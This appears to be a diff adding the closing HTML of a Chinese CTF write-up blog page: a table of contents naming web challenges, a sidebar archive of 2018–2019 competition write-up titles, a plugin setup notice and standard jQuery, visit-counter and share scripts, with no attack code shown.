+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Port-51"><span class="toc-number">1.</span> <span class="toc-text">Port 51</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Simple-injection"><span class="toc-number">2.</span> <span class="toc-text">Simple injection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EASY-gallery"><span class="toc-number">3.</span> <span class="toc-text">EASY gallery</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IN-A-MESS"><span class="toc-number">4.</span> <span class="toc-text">IN A MESS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#api调用"><span class="toc-number">5.</span> <span class="toc-text">api调用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#inject"><span class="toc-number">6.</span> <span class="toc-text">inject</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#babyphp"><span class="toc-number">7.</span> <span class="toc-text">babyphp</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 22
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/19</span><a class="archive-post-title" href="/2019/05/19/padding oracle/">padding oracle学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/17</span><a class="archive-post-title" href="/2019/05/17/DataConDns1/">360Datacon大数据安全比赛DNS方向一WP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/27</span><a class="archive-post-title" href="/2019/04/27/2019国赛部分题目WP---NEX的小老妹/">2019国赛部分题目wp-by NEX</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/18</span><a class="archive-post-title" href="/2019/04/18/2019DDctfWP/">2019DDctfWP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/28</span><a class="archive-post-title" href="/2019/03/28/安恒杯西湖论剑/">安恒杯西湖论剑wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/12</span><a class="archive-post-title" href="/2019/02/12/hgame2019/">hgame-2019 wp</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/22</span><a class="archive-post-title" href="/2018/12/22/安恒杯12月份部分wp/">安恒杯12月份部分wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/2018/11/28/安恒杯11月份web/">安恒杯11月份web部分wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/21</span><a class="archive-post-title" href="/2018/11/21/CBC字节反转攻击问题/">CBC反转攻击问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/18</span><a class="archive-post-title" href="/2018/11/18/湖湘杯/">湖湘杯部分题目wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/17</span><a class="archive-post-title" href="/2018/11/17/2018高校网络安全信息安全管理运维挑战赛/">2018高校网络信息安全管理运维挑战赛wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/13</span><a class="archive-post-title" href="/2018/11/13/2018-hctf/">2018-hctf-wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/07</span><a class="archive-post-title" href="/2018/11/07/uploads/">uploads-labs总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href="/2018/11/06/php伪协议/">php伪协议的一些总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/04</span><a class="archive-post-title" href="/2018/11/04/2018上海市大学生部分wp/">2018上海市大学生部分wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/03</span><a class="archive-post-title" href="/2018/11/03/ichunqiuweb/">ichunqiu web部分wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/2018/11/02/nctf/">南邮ctf平台</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/27</span><a class="archive-post-title" href="/2018/10/27/安恒11月/">安恒杯11月份密码学部分wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span><a class="archive-post-title" href="/2018/10/26/jarvisoj/">jarvisoj web部分wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/24</span><a class="archive-post-title" href="/2018/10/24/phpxuliehua/">PHP反序列化的一些例子</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/18</span><a class="archive-post-title" href="/2018/10/18/bugku/">bugCTF-web方向wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href="/2018/10/16/ustc/">2018ustcCTF部分题目wp</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
+    
+        <span class="sidebar-tag-name" data-tags="Analysis"><span class="iconfont-archer">&#xe606;</span>Analysis</span>
+    
+        <span class="sidebar-tag-name" data-tags="总结"><span class="iconfont-archer">&#xe606;</span>总结</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Bling_Dog"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
